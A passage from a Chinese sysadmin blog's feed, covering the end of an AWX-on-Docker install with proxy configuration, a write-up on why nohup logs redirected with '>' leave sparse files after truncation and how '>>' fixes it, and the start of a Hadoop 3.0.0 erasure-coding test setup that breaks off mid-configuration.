24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动服务</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systemctl start docker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl enable docker</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>clone awx代码</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/ansible/awx.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd awx/installer/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 注意修改一下postgres_data_dir到其他目录比如/data/pgdocker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi inventory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ansible-playbook -i inventory install.yml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>检查日志</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker logs -f awx_task</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>以上是安装过程，因为本地环境访问外网要经过代理，这里记录一下配置docker通过代理访问外网的方式，否则pull image会有问题。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir /etc/systemd/system/docker.service.d/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat &gt; /etc/systemd/system/docker.service.d/http-proxy.conf &lt;&lt;EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Service]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Environment="HTTP_PROXY=proxy.test.dev:8080" "HTTPS_PROXY=proxy.test.dev:8080" "NO_PROXY=localhost,127.0.0.1,172.1.0.2"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl daemon-reload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl restart docker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl show --property=Environment docker</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>参考文档：</p><p>[1]<!-- --> <a href="http://khmel.org/?p=1245" target="_blank" rel="noopener noreferrer">http://khmel.org/?p=1245</a></p><p>[2]<!-- --> <a href="https://docs.docker.com/engine/admin/systemd/#httphttps-proxy" target="_blank" rel="noopener noreferrer">https://docs.docker.com/engine/admin/systemd/#httphttps-proxy</a></p>]]></content>
        <category label="system" term="system"/>
        <category label="shell" term="shell"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[很诡异的服务日志无法切割问题分析]]></title>
        <id>/2017/10/19/bash-nohup-log-truncate</id>
        <link href="https://itxx00.github.io/notes/blog/2017/10/19/bash-nohup-log-truncate"/>
        <updated>2017-10-19T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[遇到某服务进程产生的日志始终无法切割，原来原因在这里]]></summary>
        <content type="html"><![CDATA[<blockquote><p>遇到某服务进程产生的日志始终无法切割，原来原因在这里</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="问题现象">问题现象<a class="hash-link" href="#问题现象" title="标题的直接链接">​</a></h2><p>某业务机器因磁盘容量超过阈值收到告警，分析发现是由于该机器上某个服务进程产生的日志文件量太大，且日志文件未按周期切割，进而导致历史日志信息积累到单个日志文件中。
未避免故障发生采取临时措施手工切割该日志文件，由于该服务进程并未提供内置的日志切割，因此手工模拟类似logrotate的<code>copytruncate</code>模式对日志进行切割。
但在将日志truncate之后，奇怪的一幕发生了，通过ls查看文件大小发现并未减少，直觉判断这可能是文件句柄一直处于打开状态且偏移量未发生改变导致。
在进一步检查了该进程的启动方式之后，发现该进程通过nohup启动，并将标准输出重定向到持续增大的日志文件中。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="模拟">模拟<a class="hash-link" href="#模拟" title="标题的直接链接">​</a></h2><p>我们通过下面几行脚本来模拟此现象：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sleep</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">head</span><span class="token plain"> -5000 /dev/urandom</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>脚本启动后会有一个常驻进程每个1秒钟输出一堆字符串以此来模拟日志文件增涨，我们按照以下方式启动：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">nohup</span><span class="token plain"> ./daemon.sh </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">out.log </span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> /dev/null </span><span class="token operator" style="color:#393A34">&amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>等待一会之后我们观察到日志已经写入了</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# ll -h out.log ;du -h out.log </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r-- 1 root root 64M Oct 19 17:41 out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">64M   out.log</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接着将日志文件清空，再观察文件大小变化</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# truncate -s0 out.log              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# ll -h out.log ;du -h out.log </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r-- 1 root root 93M Oct 19 17:41 out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4.0M  out.log</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这时可以看到，虽然文件被清空了，但是ls看到的大小依然没有发生变化，也就是说文件中产生了大量空洞。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="解决方法">解决方法<a class="hash-link" href="#解决方法" title="标题的直接链接">​</a></h2><p>将nohup启动进程后的输出重定向 <code>&gt;</code> 替换为 <code>&gt;&gt;</code>， 即改为append模式来写入日志，这时再truncate就不会出现上面的问题了。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> nohup ./daemon.sh &gt;&gt;out.log 2&gt;&amp;1  &lt;/dev/null &amp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# ll -h out.log ;du -h out.log </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r-- 1 root root 48M Oct 19 19:43 out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">64M   out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# ll -h out.log ;du -h out.log </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r-- 1 root root 77M Oct 19 19:43 out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">128M  out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# truncate -s0 out.log              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost t]# ll -h out.log ;du -h out.log </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r-- 1 root root 1.3M Oct 19 19:43 out.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2.0M  out.log</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里留一个问题： 为什么使用<code>append</code>模式就不会出现这个问题？</p><p>参考文档：</p><p>[1]<!-- --> <a href="https://www.gnu.org/software/bash/manual/bash.html#Redirections" target="_blank" rel="noopener noreferrer">https://www.gnu.org/software/bash/manual/bash.html#Redirections</a></p><p>[2]<!-- --> <a href="https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html" target="_blank" rel="noopener noreferrer">https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html</a></p>]]></content>
        <category label="system" term="system"/>
        <category label="shell" term="shell"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[HADOOP3.0.0纠删码测试]]></title>
        <id>/2017/08/20/hadoop3-ec-test</id>
        <link href="https://itxx00.github.io/notes/blog/2017/08/20/hadoop3-ec-test"/>
        <updated>2017-08-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[描述]]></summary>
        <content type="html"><![CDATA[<blockquote><p>记录hadoop3.0.0版本测试安装过程，对hadoop3.0.0中纠删码进行了简单测试。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="基础环境">基础环境<a class="hash-link" href="#基础环境" title="标题的直接链接">​</a></h2><p>HADOOP3.0.0版本中增加了纠删码技术，在提高可用性的同时还能减低存储成本，目前处于实验阶段，以下将测试环境中的搭建步骤及简单测试过程进行记录。本次仅对hdfs进行测试，因此不会部署其他服务。</p><p>系统环境如下：</p><p>kvm虚拟机，1个namenode节点，6个datanode节点，4core ，8G mem ， 50G disk</p><p>hadoop版本：3.0.0-alpha4</p><p>java版本： 1.8.0_144</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="测试集群安装">测试集群安装<a class="hash-link" href="#测试集群安装" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="基础包安装">基础包安装<a class="hash-link" href="#基础包安装" title="标题的直接链接">​</a></h3><p>从apache镜像下载hadoop-3.0.0-alpha4，当前最新版本，hadoop home目录/opt/hadoop，在namenode节点将配置等修改好之后拷贝到所有datanode节点。</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">tar</span><span class="token plain"> xf hadoop-3.0.0-alpha4.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> hadoop-3.0.0-alpha4 /opt/hadoop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">yum -y </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> jdk --disablerepo</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">* --enablerepo</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">local-custom</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置文件修改">配置文件修改<a class="hash-link" href="#配置文件修改" title="标题的直接链接">​</a></h3><p>需要修改的配置文件有hadoop-env.sh 、core-site.xml、hdfs-site.xml</p><p>修改<code>/opt/hadoop/etc/hadoop/hadoop-env.sh</code>中以下参数：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">JAVA_HOME</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/java/jdk1.8.0_144</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HADOOP_HOME</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/opt/hadoop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 注意这里配置heapsize和2.7版本的差别，2.7为HADOOP_HEAPSIZE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HADOOP_HEAPSIZE_MAX</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1024</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HADOOP_OPTS</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$HADOOP_OPTS</span><span class="token string" style="color:#e3116c"> -Djava.net.preferIPv4Stack=true”</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">export HADOOP_CLIENT_OPTS="</span><span class="token plain">-Xmx512m </span><span class="token variable" style="color:#36acaa">$HADOOP_CLIENT_OPTS</span><span class="token plain">”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HADOOP_LOG_DIR</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">${HADOOP_HOME}</span><span class="token plain">/logs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HADOOP_PID_DIR</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>修改<code>/opt/hadoop/etc/hadoop/hdfs-site.xml</code>内容如下：</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">configuration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.blocksize</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">134217728</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.datanode.data.dir</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">/data/hdfs/data</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">final</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">final</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.namenode.name.dir</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">/data/hdfs/namenode</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">final</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">final</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.namenode.rpc-address</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">192.168.199.26:8020</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token 